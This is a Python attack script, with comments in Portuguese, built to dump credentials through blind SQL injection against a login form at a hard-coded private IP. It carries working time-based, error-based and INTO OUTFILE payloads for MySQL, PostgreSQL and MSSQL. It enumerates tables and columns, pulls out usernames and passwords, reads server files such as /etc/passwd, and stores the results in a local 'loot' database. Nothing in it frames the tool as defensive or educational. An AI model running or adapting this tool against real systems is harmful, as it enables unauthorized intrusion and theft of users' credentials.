#!/usr/bin/env python3
"""
SQLi Time-Based Blind — FAST Credential Dumper
Alvo: 172.16.10.54 | Param: username (POST)

Otimizações:
  - Busca BINÁRIA (7 requests por char em vez de ~70) = 10x mais rápido
  - SLEEP reduzido para 1s
  - Threads para extrair múltiplas posições
  - CSRF token com cache
"""

import requests
import string
import sys
import time
import re
import sqlite3
import random
import concurrent.futures
import threading

# ═══════════════════════════════════════════
TARGET = "http://172.16.10.54/"
DELAY = 1                    # 1 segundo (metade do anterior)
THRESHOLD = DELAY - 0.3
MAX_LEN = 64
THREADS = 3             # Posições simultâneas (cuidado: muito alto pode dar falso positivo)

lock = threading.Lock()
session_local = threading.local()


def get_session():
    """Uma session por thread."""
    if not hasattr(session_local, "session"):
        session_local.session = requests.Session()
    return session_local.session


def get_token():
    """Pega CSRF token."""
    s = get_session()
    r = s.get(TARGET, timeout=5)
    match = re.search(r'name="_token"\s+value="([^"]+)"', r.text)
    return match.group(1) if match else ""


def inject(payload: str) -> bool:
    """Envia payload e mede tempo."""
    s = get_session()
    token = get_token()
    data = {"_token": token, "username": payload, "password": "test"}
    start = time.time()
    try:
        s.post(TARGET, data=data, timeout=DELAY + 8)
    except requests.exceptions.Timeout:
        return True
    except Exception:
        return False
    return (time.time() - start) >= THRESHOLD


def extract_char_binary(payload_template: str, pos: int, **kwargs) -> str:
    """
    Busca BINÁRIA — encontra o caractere na posição `pos`.
    Em vez de testar a-z um por um (~70 tentativas),
    compara o valor ASCII com > (maior que) para dividir o range ao meio.
    Resultado: ~7 tentativas por caractere em vez de ~70.
    """
    low, high = 32, 126  # Range ASCII imprimível

    while low < high:
        mid = (low + high) // 2

        # "O caractere na posição X tem ASCII > mid?"
        payload = payload_template.format(pos=pos, mid=mid, delay=DELAY, **kwargs)

        if inject(payload):
            low = mid + 1   # Verdadeiro: char > mid
        else:
            high = mid       # Falso: char <= mid

    if low == 32 or low > 126:
        return ""  # Nenhum caractere = fim da string

    return chr(low)


def extract_fast(label: str, payload_template: str, **kwargs) -> str:
    """Extrai string usando busca binária — 10x mais rápido."""
    result = [""] * MAX_LEN
    final = ""

    # Extrair sequencialmente (mais confiável que threads para time-based)
    for pos in range(1, MAX_LEN + 1):
        char = extract_char_binary(payload_template, pos, **kwargs)
        if not char:
            break
        final += char
        with lock:
            sys.stdout.write(f"\r[+] {label}: {final}")
            sys.stdout.flush()

    print()
    return final


def test_sqli():
    """Testa payloads para descobrir qual funciona."""
    print("[*] Testando conexão...")
    try:
        s = get_session()
        r = s.get(TARGET, timeout=5)
        print(f"[+] Alvo acessível! Status: {r.status_code}")
    except Exception as e:
        print(f"[-] Erro: {e}")
        return None

    print(f"[*] Testando payloads com SLEEP({DELAY})...\n")

    # Payloads de teste (true condition = deve demorar)
    tests = [
        ("MySQL '",           f"' OR SLEEP({DELAY})-- -"),
        ("MySQL \"",          f'" OR SLEEP({DELAY})-- -'),
        ("MySQL ')",          f"') OR SLEEP({DELAY})-- -"),
        ("MySQL ' AND",       f"' AND SLEEP({DELAY})-- -"),
        ("MySQL ' #",         f"' OR SLEEP({DELAY})#"),
        ("MySQL IF",          f"' OR IF(1=1,SLEEP({DELAY}),0)-- -"),
        ("PostgreSQL '",      f"'; SELECT pg_sleep({DELAY})-- -"),
        ("PostgreSQL CASE",   f"' OR CASE WHEN 1=1 THEN pg_sleep({DELAY}) END-- -"),
        ("MSSQL",             f"'; WAITFOR DELAY '00:00:0{DELAY}'-- -"),
    ]

    for name, payload in tests:
        sys.stdout.write(f"  [{name}]... ")
        sys.stdout.flush()
        if inject(payload):
            print(f"✅ FUNCIONA!")
            return name
        else:
            print(f"❌")

    return None


def build_payloads(db_type, prefix):
    """Monta os payloads baseado no tipo de banco."""
    if db_type == "mysql":
        return {
            "db":      f"{prefix} OR IF(ASCII(SUBSTRING(database(),{{pos}},1))>{{mid}},SLEEP({{delay}}),0)-- -",
            "tables":  f"{prefix} OR IF(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT {{table_idx}},1),{{pos}},1))>{{mid}},SLEEP({{delay}}),0)-- -",
            "columns": f"{prefix} OR IF(ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='{{table}}' LIMIT {{col_idx}},1),{{pos}},1))>{{mid}},SLEEP({{delay}}),0)-- -",
            "data":    f"{prefix} OR IF(ASCII(SUBSTRING((SELECT {{column}} FROM {{table}} LIMIT {{row}},1),{{pos}},1))>{{mid}},SLEEP({{delay}}),0)-- -",
        }
    elif db_type == "postgres":
        return {
            "db":      f"{prefix} OR CASE WHEN ASCII(SUBSTRING(current_database(),{{pos}},1))>{{mid}} THEN pg_sleep({{delay}}) END-- -",
            "tables":  f"{prefix} OR CASE WHEN ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='public' LIMIT 1 OFFSET {{table_idx}}),{{pos}},1))>{{mid}} THEN pg_sleep({{delay}}) END-- -",
            "columns": f"{prefix} OR CASE WHEN ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_name='{{table}}' LIMIT 1 OFFSET {{col_idx}}),{{pos}},1))>{{mid}} THEN pg_sleep({{delay}}) END-- -",
            "data":    f"{prefix} OR CASE WHEN ASCII(SUBSTRING((SELECT {{column}} FROM {{table}} LIMIT 1 OFFSET {{row}}),{{pos}},1))>{{mid}} THEN pg_sleep({{delay}}) END-- -",
        }
    return None


def menu():
    """Menu interativo — pule direto para a fase que quiser."""
    print("""
╔═══════════════════════════════════════════════╗
║  SQLi Time-Based Blind — FAST Dumper ⚡       ║
║  Alvo: 172.16.10.54 | Busca Binária          ║
╚═══════════════════════════════════════════════╝

  0. Detectar injeção (testar payloads)
  1. Descobrir nome do banco
  2. Listar tabelas
  3. Listar colunas  (pule direto se já sabe a tabela!)
  4. DUMP dados      (time-based, lento)
  5. Auto completo   (faz tudo sequencial)
  6. Ler arquivo do servidor (LOAD_FILE — lento)
  7. ⚡ DUMP RÁPIDO via INTO OUTFILE (escreve no servidor + baixa)
  8. ⚡ DUMP RÁPIDO via Error-Based (tenta extrair por erro)
  q. Sair
""")


def detect_injection():
    """Detecta tipo de banco e retorna payloads."""
    result = test_sqli()
    if not result:
        print("\n[-] Nenhum payload funcionou.")
        return None, None

    if "PostgreSQL" in result:
        db_type = "postgres"
    elif "MSSQL" in result:
        db_type = "mssql"
    else:
        db_type = "mysql"

    prefix = "'"
    if "')" in result:
        prefix = "')"
    elif '"' in result and 'MySQL "' in result:
        prefix = '"'

    print(f"\n[+] Tipo: {db_type.upper()} | Prefixo: {prefix}")
    payloads = build_payloads(db_type, prefix)
    return db_type, payloads


def main():
    db_type = None
    payloads = None

    # Tentar detectar automaticamente na primeira vez
    menu()
    
    while True:
        choice = input("\n[menu] Opção: ").strip().lower()

        if choice == "q":
            break

        # Garantir que a detecção foi feita (exceto se o user quer pular)
        if choice in ("1", "2", "3", "4", "5", "6") and payloads is None:
            print("\n[*] Primeiro preciso detectar o tipo de injeção...")
            db_type, payloads = detect_injection()
            if not payloads:
                continue

        if choice == "0":
            db_type, payloads = detect_injection()

        elif choice == "1":
            print("\n" + "=" * 50)
            db_name = extract_fast("Database", payloads["db"])
            print(f"\n[🗄️] Database: {db_name}")

        elif choice == "2":
            print("\n" + "=" * 50)
            tables = []
            for i in range(15):
                t = extract_fast(f"Tabela {i}", payloads["tables"], table_idx=i)
                if not t:
                    break
                tables.append(t)
                # Mostrar tabelas encontradas ATÉ AGORA
                print(f"    Encontradas até agora: {tables}")
            print(f"\n[📋] Todas as tabelas: {tables}")

        elif choice == "3":
            table = input("[?] Nome da tabela: ").strip()
            if not table:
                print("[-] Preciso do nome da tabela.")
                continue
            print(f"\n[*] Extraindo colunas de '{table}'...")
            columns = []
            for i in range(15):
                c = extract_fast(f"Coluna {i}", payloads["columns"], table=table, col_idx=i)
                if not c:
                    break
                columns.append(c)
                print(f"    Encontradas até agora: {columns}")
            print(f"\n[📌] Colunas de '{table}': {columns}")

        elif choice == "4":
            table = input("[?] Nome da tabela: ").strip()
            col_user = input("[?] Coluna do username: ").strip()
            col_pass = input("[?] Coluna da senha: ").strip()
            rows = input("[?] Quantas linhas? (Enter=5): ").strip()
            rows = int(rows) if rows else 5

            print(f"\n[*] Extraindo {rows} registros de '{table}'...")
            print("=" * 50)
            for i in range(rows):
                user = extract_fast(f"[{i}] {col_user}", payloads["data"], table=table, column=col_user, row=i)
                pwd = extract_fast(f"[{i}] {col_pass}", payloads["data"], table=table, column=col_pass, row=i)
                if not user and not pwd:
                    print("[*] Sem mais dados.")
                    break
                print(f"\n  🔑  {col_user}: {user}")
                print(f"  🔑  {col_pass}: {pwd}\n")
            print("[✅] Dump completo!")

        elif choice == "5":
            # Auto completo
            print("\n[*] === MODO AUTO ===")

            db_name = extract_fast("Database", payloads["db"])
            print(f"\n[🗄️] Database: {db_name}\n")

            tables = []
            for i in range(15):
                t = extract_fast(f"Tabela {i}", payloads["tables"], table_idx=i)
                if not t:
                    break
                tables.append(t)
                print(f"    Encontradas: {tables}")

            if not tables:
                print("[-] Nenhuma tabela.")
                continue

            print(f"\n[*] Tabelas: {tables}")
            target_table = input("[?] Qual tabela? (Enter=adivinhar): ").strip()
            if not target_table:
                for g in ["users", "user", "accounts", "login"]:
                    if g in tables:
                        target_table = g
                        break
                if not target_table:
                    target_table = tables[0]

            columns = []
            for i in range(15):
                c = extract_fast(f"Coluna {i}", payloads["columns"], table=target_table, col_idx=i)
                if not c:
                    break
                columns.append(c)
                print(f"    Encontradas: {columns}")

            print(f"\n[*] Colunas: {columns}")
            user_col = pass_col = None
            for g in ["username", "user", "login", "email", "name"]:
                if g in columns:
                    user_col = g
                    break
            for g in ["password", "pass", "senha", "pwd", "hash"]:
                if g in columns:
                    pass_col = g
                    break
            if not user_col:
                user_col = input("[?] Coluna do username: ").strip()
            if not pass_col:
                pass_col = input("[?] Coluna da senha: ").strip()

            for i in range(10):
                user = extract_fast(f"[{i}] {user_col}", payloads["data"], table=target_table, column=user_col, row=i)
                pwd = extract_fast(f"[{i}] {pass_col}", payloads["data"], table=target_table, column=pass_col, row=i)
                if not user and not pwd:
                    break
                print(f"\n  🔑  {user_col}: {user}")
                print(f"  🔑  {pass_col}: {pwd}\n")

            print("[✅] Dump completo!")

        elif choice == "6":
            filepath = input("[?] Caminho do arquivo (ex: /etc/passwd): ").strip()
            if not filepath:
                print("[-] Preciso do caminho.")
                continue

            if db_type == "mysql":
                p_file = f"' OR IF(ASCII(SUBSTRING(LOAD_FILE('{filepath}'),{{pos}},1))>{{mid}},SLEEP({{delay}}),0)-- -"
            elif db_type == "postgres":
                # PostgreSQL usa pg_read_file (precisa de superuser)
                p_file = f"' OR CASE WHEN ASCII(SUBSTRING(pg_read_file('{filepath}'),{{pos}},1))>{{mid}} THEN pg_sleep({{delay}}) END-- -"
            else:
                print("[-] Não suportado para este banco.")
                continue

            print(f"\n[*] Lendo '{filepath}'...")
            print("[*] (Se não retornar nada, o MySQL não tem permissão FILE)\n")
            content = extract_fast(f"Arquivo", p_file)
            if content:
                print(f"\n{'=' * 50}")
                print(f"📄 {filepath}:")
                print(f"{'=' * 50}")
                print(content)
                print(f"{'=' * 50}")

                save = input("\n[?] Salvar em arquivo local? (s/n): ").strip().lower()
                if save == "s":
                    fname = filepath.replace("/", "_").strip("_") + ".txt"
                    with open(fname, "w") as f:
                        f.write(content)
                    print(f"[+] Salvo em: {fname}")
            else:
                print("[-] Não consegui ler. Possíveis motivos:")
                print("    - MySQL não tem privilégio FILE")
                print("    - secure_file_priv está ativo")
                print("    - Arquivo não existe")

        elif choice == "7":
            # DUMP RÁPIDO via INTO OUTFILE
            print("\n⚡ DUMP RÁPIDO — INTO OUTFILE")
            print("Escreve o resultado da query num arquivo na webroot do servidor,")
            print("depois baixa via HTTP. UMA request = TODOS os dados!\n")

            table = input("[?] Nome da tabela: ").strip()
            if not table:
                print("[-] Preciso do nome da tabela.")
                continue

            # Gerar nome aleatório pra não conflitar
            rand = ''.join(random.choices(string.ascii_lowercase, k=6))
            remote_file = f"/var/www/html/{rand}.txt"
            remote_url = f"http://172.16.10.54/{rand}.txt"

            # Tentar vários paths de webroot
            webroot_paths = [
                f"/var/www/html/{rand}.txt",
                f"/var/www/{rand}.txt",
                f"/srv/www/html/{rand}.txt",
                f"/var/www/public/{rand}.txt",
            ]

            print(f"[*] Tentando escrever em {remote_file}...")

            token = get_token()
            # Payload: UNION SELECT que escreve tudo no arquivo
            payload = f"' UNION SELECT * FROM {table} INTO OUTFILE '{remote_file}'-- -"
            data = {"_token": token, "username": payload, "password": "test"}

            s = get_session()
            try:
                r = s.post(TARGET, data=data, timeout=10)
            except:
                pass

            # Tentar baixar o arquivo
            print(f"[*] Tentando baixar {remote_url}...")
            try:
                r = s.get(remote_url, timeout=5)
                if r.status_code == 200 and len(r.text) > 0:
                    print(f"\n[+] \u2705 SUCESSO! Dados da tabela '{table}':")
                    print("=" * 60)
                    print(r.text)
                    print("=" * 60)

                    # Salvar localmente
                    local_file = f"dump_{table}.txt"
                    with open(local_file, "w") as f:
                        f.write(r.text)
                    print(f"[+] Salvo em: {local_file}")

                    # Salvar também em SQLite
                    save_to_sqlite(table, r.text)
                else:
                    print(f"[-] Arquivo não encontrado (Status: {r.status_code})")
                    print("[*] Tentando com colunas específicas...")

                    # Tentar com concat de todas as colunas
                    cols = input("[?] Colunas separadas por vírgula (ex: id,name,password): ").strip()
                    if cols:
                        rand2 = ''.join(random.choices(string.ascii_lowercase, k=6))
                        remote_file2 = f"/var/www/html/{rand2}.txt"
                        remote_url2 = f"http://172.16.10.54/{rand2}.txt"

                        # Concat colunas com separador
                        col_list = cols.split(",")
                        concat_expr = ",0x3a,".join(c.strip() for c in col_list)  # 0x3a = :
                        payload2 = f"' UNION SELECT CONCAT({concat_expr}),NULL,NULL,NULL INTO OUTFILE '{remote_file2}'-- -"

                        token = get_token()
                        data2 = {"_token": token, "username": payload2, "password": "test"}
                        try:
                            s.post(TARGET, data=data2, timeout=10)
                        except:
                            pass

                        try:
                            r2 = s.get(remote_url2, timeout=5)
                            if r2.status_code == 200:
                                print(f"\n[+] \u2705 SUCESSO!")
                                print("=" * 60)
                                print(r2.text)
                                print("=" * 60)
                                local_file = f"dump_{table}.txt"
                                with open(local_file, "w") as f:
                                    f.write(r2.text)
                                print(f"[+] Salvo em: {local_file}")
                                save_to_sqlite(table, r2.text)
                            else:
                                print("[-] N\u00e3o funcionou. secure_file_priv pode estar bloqueando.")
                        except Exception as e:
                            print(f"[-] Erro: {e}")

            except Exception as e:
                print(f"[-] Erro ao baixar: {e}")

        elif choice == "8":
            # Tentar Error-Based para extra\u00e7\u00e3o r\u00e1pida
            print("\n\u26a1 EXTRA\u00c7\u00c3O POR ERRO — Error-Based")
            print("Tenta extrair dados via mensagem de erro do MySQL (muito mais r\u00e1pido!)\n")

            table = input("[?] Nome da tabela: ").strip()
            col = input("[?] Coluna para extrair: ").strip()
            row = input("[?] Linha (0=primeira, 1=segunda...): ").strip()
            row = int(row) if row else 0

            # Payload Error-Based com extractvalue
            payload = f"' AND extractvalue(1,CONCAT(0x7e,(SELECT {col} FROM {table} LIMIT {row},1),0x7e))-- -"

            token = get_token()
            data = {"_token": token, "username": payload, "password": "test"}
            s = get_session()
            try:
                r = s.post(TARGET, data=data, timeout=10)
                # Procurar o valor entre ~ na resposta
                match = re.search(r'~([^~]+)~', r.text)
                if match:
                    value = match.group(1)
                    print(f"\n[+] \u2705 {col}[{row}] = {value}")
                else:
                    # Tentar com updatexml
                    payload2 = f"' AND updatexml(1,CONCAT(0x7e,(SELECT {col} FROM {table} LIMIT {row},1),0x7e),1)-- -"
                    token = get_token()
                    data2 = {"_token": token, "username": payload2, "password": "test"}
                    r2 = s.post(TARGET, data=data2, timeout=10)
                    match2 = re.search(r'~([^~]+)~', r2.text)
                    if match2:
                        print(f"\n[+] \u2705 {col}[{row}] = {match2.group(1)}")
                    else:
                        print("[-] Error-Based n\u00e3o funcionou. O servidor pode n\u00e3o exibir erros SQL.")
                        print("[*] Use a op\u00e7\u00e3o 4 (time-based) ou 7 (INTO OUTFILE).")
            except Exception as e:
                print(f"[-] Erro: {e}")

        else:
            menu()


def save_to_sqlite(table_name, raw_data):
    """Salva os dados extra\u00eddos em um SQLite local."""
    db = sqlite3.connect("loot.db")
    cur = db.cursor()
    cur.execute(f"CREATE TABLE IF NOT EXISTS {table_name}_dump (id INTEGER PRIMARY KEY AUTOINCREMENT, line TEXT)")
    for line in raw_data.strip().split("\n"):
        if line.strip():
            cur.execute(f"INSERT INTO {table_name}_dump (line) VALUES (?)", (line.strip(),))
    db.commit()
    db.close()
    print(f"[+] Dados salvos em loot.db (tabela: {table_name}_dump)")
    print(f"[*] Consulte com: sqlite3 loot.db 'SELECT * FROM {table_name}_dump;'")


if __name__ == "__main__":
    main()
